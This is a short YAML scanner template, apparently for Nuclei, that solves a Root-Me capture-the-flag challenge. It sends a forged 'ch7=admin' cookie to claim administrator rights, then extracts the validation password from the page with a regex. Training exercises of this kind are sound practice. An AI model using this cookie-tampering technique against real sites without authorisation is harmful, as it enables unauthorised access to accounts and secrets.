id: HTTP-cookies

info:
  name: HTTP cookies
  author: Tomitom13
  severity: unknown
  tags: cookies,http,rootme

requests:
  - method: GET
    path:
      - "{{BaseURL}}/?c=admin"
    headers:
      Cookie: "ch7=admin"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "Validation password : "
        part: body

    extractors:
      - type: regex
        name: password
        part: body
        regex:
          - "password : [a-zA-Z0-9!@#$%^&*()_+\\-,.<>?]+"
